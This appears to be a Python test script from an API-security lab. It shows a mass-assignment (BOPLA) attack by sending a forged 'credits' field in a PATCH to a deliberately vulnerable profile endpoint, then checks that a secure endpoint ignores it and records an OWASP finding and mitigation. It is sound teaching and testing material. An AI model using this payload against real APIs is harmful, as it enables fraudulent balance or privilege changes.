from common import (
    create_client,
    login,
    auth_headers,
    get_me,
    write_finding,
    print_title,
    print_result,
    ATTACKER_TICKET
)


def run_bopla_attack() -> bool:
    """
    prueba un ataque bopla, que aqui se ve como mass assignment.

    la idea es simple: mando un campo que no deberia poder tocar, que son los
    creditos, y miro si el backend se lo cree.

    primero lo intento contra el endpoint vulnerable y despues contra el seguro
    para comparar los dos comportamientos.
    """

    print_title("BOPLA / MASS ASSIGNMENT ATTACK - User Profile")

    with create_client() as client:
        #primero entro como atacante para tener un token valido
        attacker = login(client, ATTACKER_TICKET)
        token = attacker["access_token"]

        #guardo el perfil antes de tocar nada para poder comparar los creditos
        before_profile = get_me(client, token)
        before_credits = before_profile["credits"]

        print(f"Initial credits: {before_credits}")

        #aqui viene el ataque: meto credits en el json aunque no deberia poder editarlo
        malicious_credits = 777777
        vulnerable_response = client.patch(
            "/vulnerable/users/me",
            headers=auth_headers(token),
            json={
                "username": "MassAssignmentUser",
                "credits": malicious_credits
            }
        )
        vulnerable_response.raise_for_status()
        vulnerable_body = vulnerable_response.json()

        #si vuelven esos creditos, significa que el backend se ha tragado el campo
        vulnerable_changed_credits = vulnerable_body.get("credits") == malicious_credits

        print_result(
            vulnerable_changed_credits,
            "Vulnerable endpoint allowed credits modification"
        )

        #ahora hago lo mismo contra el endpoint seguro para ver si ignora credits
        secure_attempt_credits = 1
        secure_response = client.patch(
            "/secure/users/me",
            headers=auth_headers(token),
            json={
                "username": "SafeMassAssignmentUser",
                "credits": secure_attempt_credits
            }
        )
        secure_response.raise_for_status()
        secure_body = secure_response.json()

        #lo correcto es que cambie el username, pero que no cambie los creditos
        secure_ignored_credits = secure_body.get("credits") != secure_attempt_credits
        secure_username_changed = secure_body.get("username") == "SafeMassAssignmentUser"

        print_result(
            secure_ignored_credits,
            "Secure endpoint ignored unauthorized credits modification"
        )
        print_result(
            secure_username_changed,
            "Secure endpoint allowed only username modification"
        )
        confirmed = vulnerable_changed_credits and secure_ignored_credits

        #guardo todo lo importante para poder enseñarlo luego en el informe
        write_finding(
            vulnerability="Broken Object Property Level Authorization / Mass Assignment",
            severity="High",
            endpoint="/vulnerable/users/me",
            owasp_category="API3:2023 Broken Object Property Level Authorization",
            confirmed=confirmed,
            evidence={
                "initial_profile": before_profile,
                "vulnerable_payload": {
                    "username": "MassAssignmentUser",
                    "credits": malicious_credits
                },
                "vulnerable_response": vulnerable_body,
                "secure_payload": {
                    "username": "SafeMassAssignmentUser",
                    "credits": secure_attempt_credits
                },
                "secure_response": secure_body,
                "expected_secure_behavior": (
                    "username is updated, but credits remains unchanged"
                )
            },
            mitigation=(
                "Use strict input DTOs and whitelist only the fields that the client "
                "is allowed to modify. Sensitive fields such as credits and is_admin "
                "must never be accepted from client-controlled JSON."
            )
        )

        return confirmed and secure_username_changed


if __name__ == "__main__":
    success = run_bopla_attack()
    raise SystemExit(0 if success else 1)
